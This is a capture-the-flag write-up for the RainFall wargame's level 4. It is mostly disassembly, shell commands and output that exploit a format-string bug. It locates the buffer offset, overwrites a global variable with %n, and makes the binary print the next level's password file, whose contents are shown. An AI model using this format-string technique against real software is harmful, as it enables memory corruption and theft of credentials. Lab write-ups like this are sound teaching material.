# Level 4

```asm
0x08048465      89442408       mov dword [stream], eax     ; FILE *stream
0x08048469      c74424040002.  mov dword [size], 0x200     ; [0x200:4]=-1 ; 512 ; int size
0x08048471      8d85f8fdffff   lea eax, [s]
0x08048477      890424         mov dword [esp], eax        ; char *s
0x0804847a      e8d1feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
0x0804847f      8d85f8fdffff   lea eax, [s]
0x08048485      890424         mov dword [esp], eax        ; char *format
0x08048488      e8b7ffffff     call sym.p
0x0804848d      a110980408     mov eax, dword [obj.m]      ; [0x8049810:4]=0
0x08048492      3d44550201     cmp eax, 0x1025544
0x08048497      750c           jne 0x80484a5
```

We can see that we need to change the value of the global variable `m` to `0x1025544`, `16930116` in decimal, we can't just add this number of bytes in the buffer and write that with `%n`, because that results in a broken pipe.

## Exploiting the pointer

```shell
level4@RainFall:~$ ./level4 <<< `python -c 'print "0000" + "%p "* 15'`
00000xb7ff26b0 0xbffff764 0xb7fd0ff4 (nil) (nil) 0xbffff728 0x804848d 0xbffff520 0x200 0xb7fd1ac0 0xb7ff37d0 0x30303030 0x25207025 0x70252070 0x20702520
level4@RainFall:~$ ./level4 <<< `python -c 'print "0000" + "%p "* 12'`
00000xb7ff26b0 0xbffff764 0xb7fd0ff4 (nil) (nil) 0xbffff728 0x804848d 0xbffff520 0x200 0xb7fd1ac0 0xb7ff37d0 0x30303030
```

We can see that the our buffer is 12 addresses in, let's simplify our format string:
```shell
level4@RainFall:~$ echo '0000%12$p' | ./level4
00000x30303030
```

Ok, let's now find the address of `m` and insert it into our format string.
```shell
level4@RainFall:~$ objdump -t ./level4 | grep '.bss'
08049804 l    d  .bss   00000000              .bss
08049808 l     O .bss   00000001              completed.6159
0804980c l     O .bss   00000004              dtor_idx.6161
08049804 g     O .bss   00000004              stdin@@GLIBC_2.0
08049810 g     O .bss   00000004              m 			# here
08049804 g       *ABS*  00000000              __bss_start
level4@RainFall:~$ ./level4 <<< `python -c 'import struct; print struct.pack("<Q", 0x08049810) + "%12$p"'`
0x8049810
```

## Lotta numbers

We can just use printf padding to add any number of characters we want, let's use that to get `m` to the right value:
```shell
(I put a breakpoint at `0x08048497`, on the `jne` instruction)
(gdb) r <<< `python -c 'import struct; print struct.pack("<Q", 0x08049810) + "%{}p".format(str(0x1025544)) + "%12$n"'`
[...]
Breakpoint 2, 0x08048497 in n ()
(gdb) p/x $eax
$14 = 0x1025548
(gdb) p $eax - 0x1025544
$15 = 4
```

Okay, let's try again but this time substracting -4 to our padding as we saw before
```shell
(gdb) r <<< `python -c 'import struct; print struct.pack("<Q", 0x08049810) + "%{}p".format(str(0x1025544-4)) + "%12$n"'`
[...]
/bin/cat: /home/user/level5/.pass: Permission denied
[Inferior 1 (process 19005) exited normally]
```
Bingo! Now outside of gdb

```shell
level4@RainFall:~$ ./level4 <<< `python -c 'import struct; print struct.pack("<Q", 0x08049810) + "%{}p".format(str(0x1025544-4)) + "%12$n"'`
[...]

                                              0xb7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
🥳

